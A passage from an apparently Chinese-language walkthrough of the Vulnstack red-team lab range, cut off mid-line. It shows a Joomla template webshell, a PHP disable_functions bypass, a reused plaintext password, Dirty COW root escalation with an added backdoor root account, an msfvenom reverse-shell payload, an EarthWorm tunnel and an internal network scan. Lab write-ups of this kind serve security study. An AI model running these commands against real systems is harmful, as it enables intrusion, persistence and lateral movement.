alt=\"image.png\"></p>\n</li>\n<li>\n<p>获取到系统信息</p>\n<pre><code class=\"hljs language-python\">Setting \tValue\nPHP Built On \tLinux ubuntu <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">142</span>-generic <span class=\"hljs-comment\">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64</span>\nDatabase <span class=\"hljs-type\">Type</span> \tmysql\nDatabase Version \t<span class=\"hljs-number\">5.7</span><span class=\"hljs-number\">.27</span>-0ubuntu0<span class=\"hljs-number\">.16</span><span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.1</span>\nDatabase Collation \tutf8_general_ci\nDatabase Connection Collation \tutf8mb4_general_ci\nPHP Version \t<span class=\"hljs-number\">7.1</span><span class=\"hljs-number\">.32</span>-<span class=\"hljs-number\">1</span>+ubuntu16<span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.1</span>+deb.sury.org+<span class=\"hljs-number\">1</span>\nWeb Server \tApache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.18</span> (Ubuntu)\nWebServer to PHP Interface \tapache2handler\nJoomla! Version \tJoomla! <span class=\"hljs-number\">3.9</span><span class=\"hljs-number\">.12</span> Stable [ Amani ] <span class=\"hljs-number\">24</span>-September-<span class=\"hljs-number\">2019</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">00</span> GMT\nJoomla! Platform Version \tJoomla Platform <span class=\"hljs-number\">13.1</span><span class=\"hljs-number\">.0</span> Stable [ Curiosity ] <span class=\"hljs-number\">24</span>-Apr-<span class=\"hljs-number\">2013</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> GMT\nUser Agent \tMozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">132.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">132.0</span> \n</code></pre>\n</li>\n<li>\n<p>通过模板<code>getshell</code></p>\n<p>修改模板<code>Extensions</code>–><code>Templates</code>–><code>Templates</code>–><code>Beez3 Details and Files</code> 的<code>error.php</code>文件，将内容替换为一句木马</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image42.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>访问<code>error.php</code>文件</p>\n<pre><code class=\"hljs language-python\">/templates/beez3/error.php\n</code></pre>\n</li>\n<li>\n<p>使用蚁🗡连接，连接成功</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image43.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>获得shell ？</h2>\n<ol>\n<li>\n<p>利用蚁🗡进行反弹<code>shell</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image44.png\" alt=\"image.png\"></p>\n<p>返回<code>ret=127</code></p>\n</li>\n<li>\n<p>寻找原因，查看之前的<code>1.php</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image45.png\" alt=\"image.png\"></p>\n<p>将执行函数禁用了（我前面使用<code>MSF</code>生成反弹<code>shell</code>代码一直不成功都怀疑自己了，原来是这里卡住了）</p>\n</li>\n<li>\n<p>绕过<strong>Disable Functions</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>\n</blockquote>\n<p>将<code>bypass_disablefunc.php</code>和<code>bypass_disablefunc_x64.so</code>通过蚁🗡上传到当前目录</p>\n<p>测试，输入<code>url</code>测试<code>pwd</code>命令</p>\n<pre><code class=\"hljs language-python\">?cmd=pwd&#x26;outpath=/var/www/html/output&#x26;sopath=/var/www/html/bypass_disablefunc_x64.so\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image46.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>尝试了反弹<code>shell</code>但是没有成功</p>\n</li>\n</ol>\n<h2>内网信息收集</h2>\n<ol>\n<li>\n<p>蚁🗡由绕过<strong>Disable Functions</strong>的插件，安装后虚拟终端可以正常回显</p>\n<blockquote>\n<p><a href=\"https://github.com/Medicean/as_bypass_php_disable_functions\">https://github.com/Medicean/as_bypass_php_disable_functions</a></p>\n</blockquote>\n</li>\n<li>\n<p>信息收集</p>\n<pre><code class=\"hljs language-python\">(www-data:/var/www/html/templates/beez3) $ ip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=\"hljs-number\">1</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: ens33: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP group default qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:ab:<span class=\"hljs-number\">32</span>:ac brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> ens33\n       valid_lft forever preferred_lft forever\n    inet6 fe80::20c:29ff:feab:32ac/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>确定web服务器的IP是<code>192.168.93.120</code></p>\n<pre><code class=\"hljs language-python\">(www-data:/var/www/html/templates/beez3) $ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n(www-data:/var/www/html/templates/beez3) $ whoami\nwww-data\n(www-data:/var/www/html/templates/beez3) $ uname -a\nLinux ubuntu <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">142</span>-generic <span class=\"hljs-comment\">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找敏感内容</p>\n<ul>\n<li>\n<p><code>/tmp</code>下存在<code>test.txt</code> ，像是一个用户</p>\n<pre><code class=\"hljs language-python\">(www-data:/tmp/mysql) $ cat test.txt\nadduser wwwuser\npasswd wwwuser_123Aqx\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>拿到一个用户的信息，我们尝试登录<code>ssh</code> ，登陆成功</p>\n<pre><code class=\"hljs language-python\">ssh wwwuser@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span> -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa\nwwwuser@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span><span class=\"hljs-string\">'s password:\nLast login: Sun Oct  6 20:24:43 2019 from 192.168.1.122\n[wwwuser@localhost ~]$  \n</span></code></pre>\n<p>查看其IP信息</p>\n<pre><code class=\"hljs language-python\">[wwwuser@localhost ~]$ ip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">16436</span> qdisc noqueue state UNKNOWN \n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:c9 brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth0\n    inet6 fe80::20c:29ff:fe32:46c9/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">3</span>: eth1: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:d3 brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth1\n    inet6 fe80::20c:29ff:fe32:46d3/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>两张网卡，可以知道这个是<code>nginx</code>服务器的主机，用来做反向代理的，内网IP是<code>192.168.93.100</code></p>\n</li>\n<li>\n<p>查看代理配置<code>/etc/nginx/nginx.conf</code></p>\n<pre><code class=\"hljs language-python\">http {                                                                                                                                                                                                                                                                                                                                                                                                                            \n  server {                                                                                                                                                                                                                                                                                                                                                                                                                       \n        listen  <span class=\"hljs-number\">80</span>;                                                                                                                                                                                               \n        server_name  localhost;                                                                                                                                                                                                                                                                                                                                                                                              \n        location / {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       \n         proxy_pass  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>;                                                                                                                                                                                                                                                                                                                                                                                 \n              proxy_set_header        Host $host;                                                                                                                                                                 \n              proxy_set_header        X-Real-IP $remote_addr;  <span class=\"hljs-comment\">#获取真实ip                                                                                                                                        </span>\n              proxy_connect_timeout   <span class=\"hljs-number\">90</span>;                                                                                                                                                                         \n              proxy_send_timeout      <span class=\"hljs-number\">90</span>;                                                                                                                                                                         \n              proxy_read_timeout      <span class=\"hljs-number\">90</span>;\n              proxy_buffer_size       4k;\n              proxy_buffers           <span class=\"hljs-number\">4</span> 32k;\n              proxy_busy_buffers_size 64k;\n              proxy_temp_file_write_size 64k;\n              proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;<span class=\"hljs-comment\">#获取代理者的真实ip</span>\n              proxy_redirect          off;\n}\n}\n}\nstream  {                                                                                                                                                                                                                                                                                                                                                                                                                         \nupstream proxy_name {                                                                                                                                                                                                                                                                                                                                                                                                             \n    server <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">3306</span>;                                                                                                                                                                                                                                                                                                                                                                                                 \n}                                                                                                                                                                                                                                                        \nserver {                                                                          \n    listen <span class=\"hljs-number\">3306</span>;                                                                   \n    proxy_pass proxy_name;                                                                                                                    \n}                                                \n}\n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>尝试提权<code>nginx</code>主机，方便后续操作，查看内核<code>2.6.32</code>在脏牛(<code>DirtyCow</code>)(<code>CVE-2016-5195</code>)的范围内</p>\n<pre><code class=\"hljs language-python\">[wwwuser@localhost tmp]$ uname -a\nLinux localhost.localdomain <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.32</span>-<span class=\"hljs-number\">431.</span>el6.x86_64 <span class=\"hljs-comment\">#1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p><code>EXP</code>地址<a href=\"https://github.com/FireFart/dirtycow\">https://github.com/FireFart/dirtycow</a></p>\n<p>将EXP传到靶机上去，然后编译执行</p>\n<pre><code class=\"hljs language-python\">gcc -pthread dirty.c -o dirty -lcrypt\n./dirty <span class=\"hljs-number\">123456</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">[wwwuser@localhost tmp]$ ./dirty <span class=\"hljs-number\">123456</span> \n/etc/passwd successfully backed up to /tmp/passwd.bak\nPlease enter the new password: <span class=\"hljs-number\">123456</span>\nComplete line:\nfirefart:fi8RL.Us0cfSs:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:pwned:/root:/<span class=\"hljs-built_in\">bin</span>/bash\n\nmmap: 7f141f280000\n\nmadvise <span class=\"hljs-number\">0</span>\n\nptrace <span class=\"hljs-number\">0</span>\nDone! Check /etc/passwd to see <span class=\"hljs-keyword\">if</span> the new user was created.\nYou can log <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">with</span> the username <span class=\"hljs-string\">'firefart'</span> <span class=\"hljs-keyword\">and</span> the password <span class=\"hljs-string\">'123456'</span>.\n\nDON<span class=\"hljs-string\">'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd   \n</span></code></pre>\n<p>创建了一个新用户<code>firefart</code>，密码是<code>123456</code></p>\n</li>\n<li>\n<p>切换账户查看权限</p>\n<pre><code class=\"hljs language-python\">[firefart@localhost tmp]<span class=\"hljs-comment\"># id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) 组=<span class=\"hljs-number\">0</span>(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n</code></pre>\n<p>root！！！</p>\n</li>\n<li>\n<p>添加新的超级管理员用户（权限维持，不过很明显）</p>\n<pre><code class=\"hljs language-python\">echo <span class=\"hljs-string\">\"sunset:savbSWc4rx8NY:0:0::/:/bin/sh\"</span> >> passwd.bak\n</code></pre>\n<p>密码是<code>momaek</code> ，新建后将<code>mv /tmp/passwd.bak /etc/passwd</code> <code>DON'T FORGET TO RESTORE!</code></p>\n<p>之后就可以登录<code>sunset</code>用户来操作了</p>\n</li>\n</ol>\n<h2>上线MSF</h2>\n<ol>\n<li>\n<p>生成<code>payload</code></p>\n<pre><code class=\"hljs language-python\">msfvenom -p python/meterpreter/reverse_tcp lport=<span class=\"hljs-number\">1234</span> lhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span> -f raw > getshell.py\n</code></pre>\n</li>\n<li>\n<p>将<code>getshell.py</code> 上传到靶机，<code>kali</code>开启监听，执行<code>getshell.py</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># kali 开启监听</span>\nmsf6 > use exploit/multi/handler \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload python/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">1234</span>  \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span> \nmsf6 exploit(multi/handler) > run \n</code></pre>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 靶机执行文件</span>\n-sh-<span class=\"hljs-number\">4.1</span><span class=\"hljs-comment\"># python getshell.py </span>\n</code></pre>\n<pre><code class=\"hljs language-python\">msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span>:<span class=\"hljs-number\">1234</span> \n[*] Sending stage (<span class=\"hljs-number\">24772</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\n[*] Meterpreter session <span class=\"hljs-number\">2</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">42433</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">30</span>:03 +0800\n\nmeterpreter > \n</code></pre>\n<p>上线成功</p>\n</li>\n</ol>\n<h2>内网主机&#x26;信息探测</h2>\n<ol>\n<li>\n<p>上线<code>MSF</code>后，添加通向内网的路由</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/multi/manage/autoroute\nmeterpreter > run autoroute -p\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n\nActive Routing Table\n====================\n\n   Subnet             Netmask            Gateway\n   ------             -------            -------\n   <span class=\"hljs-number\">169.254</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>        <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>        Session <span class=\"hljs-number\">1</span>\n   <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.0</span>       <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>      Session <span class=\"hljs-number\">1</span>\n   <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.0</span>      <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>      Session <span class=\"hljs-number\">1</span>\n</code></pre>\n</li>\n<li>\n<p>使用**<code>Earthworm</code>**在<code>kali</code>和<code>Centos</code>中建立一条隧道</p>\n<blockquote>\n<p><a href=\"https://rootkiter.com/EarthWorm/\">https://rootkiter.com/EarthWorm/</a></p>\n</blockquote>\n<p><code>earthworm</code>搭建<code>socks5</code>反向代理服务 是为了让kali（攻击者）的程序进入内网，可以扫描内网主机信息等</p>\n<p>ew流量走向：本地流量–本地<code>1080</code>端口–web服务器<code>8888</code>端口（利用EW）-- 内网服务器 – web服务器的<code>8888</code>端口 – 本地<code>1080</code>端口</p>\n<ul>\n<li>\n<p>Kali（此处用的是反向的）</p>\n<pre><code class=\"hljs language-python\">./ew_for_linux64 -s rcsocks -l <span class=\"hljs-number\">1080</span> -e <span class=\"hljs-number\">8888</span>\nrcsocks <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">1080</span> &#x3C;--[<span class=\"hljs-number\">10000</span> usec]--> <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">8888</span>\ninit cmd_server_for_rc here\nstart listen port here\n</code></pre>\n</li>\n<li>\n<p>Centos</p>\n<pre><code class=\"hljs language-python\">./ew_for_linux64 -s rssocks -d <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span> -e <span class=\"hljs-number\">8888</span>\n</code></pre>\n</li>\n<li>\n<p>设置<code>proxychain4</code> ，注意：<code>proxychain4</code> 只能代理<code>TCP</code>或者<code>UDP</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># vim /etc/proxychains4.conf   </span>\nsocks5  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>       <span class=\"hljs-number\">1080</span>\n</code></pre>\n</li>\n</ul>\n<p>测试，因为上面通过查看<code>Nginx</code>的反向代理配置得知Web服务器为<code>192.168.93.120</code> ，我们正常是不可以直接<code>curl</code>到内容，但是通过代理后就可以直接<code>curl</code>了</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 不经过代理</span>\ncurl <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>             \ncurl: (<span class=\"hljs-number\">7</span>) Failed to connect to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span> port <span class=\"hljs-number\">80</span> after <span class=\"hljs-number\">0</span> ms: Could <span class=\"hljs-keyword\">not</span> connect to server\n<span class=\"hljs-comment\"># 经过代理</span>\nproxychains4 curl <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>     \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class=\"hljs-number\">.4</span>\n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">80</span>  ...  OK\n&#x3C;!DOCTYPE html>\n&#x3C;html lang=<span class=\"hljs-string\">\"en-gb\"</span> <span class=\"hljs-built_in\">dir</span>=<span class=\"hljs-string\">\"ltr\"</span>>\n&#x3C;head>\n        &#x3C;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width, initial-scale=1.0\"</span> />\n        &#x3C;meta charset=<span class=\"hljs-string\">\"utf-8\"</span> />\n        &#x3C;base href=<span class=\"hljs-string\">\"http://192.168.93.120/\"</span> />\n      .....\n</code></pre>\n</li>\n<li>\n<p>内网主机探测</p>\n<ul>\n<li>\n<p>进入<code>Centos</code>命令行，然后上传<code>fscan</code> 来扫描内网</p>\n<p>然后将扫描结果存放到<code>1.txt</code></p>\n<pre><code class=\"hljs language-python\">./fscan -h <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">24</span> > <span class=\"hljs-number\">1.</span>txt \n</code></pre>\n</li>\n<li>\n<p><code>ICMP</code>存活主机</p>\n<pre><code class=\"hljs language-python\">(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>  <span class=\"hljs-keyword\">is</span> alive\n(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>   <span class=\"hljs-keyword\">is</span> alive\n(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>   <span class=\"hljs-keyword\">is</span> alive\n(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>   <span class=\"hljs-keyword\">is</span> alive\n(icmp) Target <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>  <span class=\"hljs-keyword\">is</span> alive\n</code></pre>\n</li>\n<li>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">3306</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">3306</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">1433</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">139</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">139</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">139</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">135</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">135</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">135</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">80</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">80</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">80</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">22</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">22</span> <span class=\"hljs-built_in\">open</span>\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">88</span> <span class=\"hljs-built_in\">open</span>\n</code></pre>\n</li>\n<li>\n<p>主机系统</p>\n<pre><code class=\"hljs language-python\">[*] NetInfo \n[*]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\n   [->]WIN-8GA56TNV3MV\n   [->]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\n[*] NetInfo \n[*]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>\n   [->]win7\n   [->]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>\n[*] NetInfo \n[*]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\n   [->]win2008\n   [->]<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\n[*] OsInfo <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>\t(Windows <span 